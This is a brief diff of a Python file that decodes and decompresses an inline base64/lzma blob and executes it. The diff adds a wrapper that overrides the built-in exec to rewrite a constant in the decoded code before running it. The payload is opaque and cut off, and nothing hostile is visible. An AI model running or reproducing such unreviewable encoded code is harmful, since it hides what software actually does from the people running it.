@@ -1,4 +1,6 @@
 import lzma,base64
+_e=exec
+def exec(s):_e(s.replace(b'L=120000',b'L=140000'),globals(),globals())
 exec(lzma.decompress(base64.b64decode('''/Td6WFoAAATm1rRGAgAhARwAAAAQz1jM4BvyCgtdADSbSme4Ujxz7TSDI5MJ/PW4TxETdXQ6X1Ob
 w1uHztPm83TvTVjJjG1QRhvE5+0ndpJlnDXexcrhy/UrHflNFzDPQPr0BoKdBtybGCcQrEf8rIbn
 B6GbMll2vhZJ0eQISrKPOpBhSUK5jt9r4PzvEH2ErVuU492R3zXTh40qVOQTc4c5t3OcX9Z8SGPh
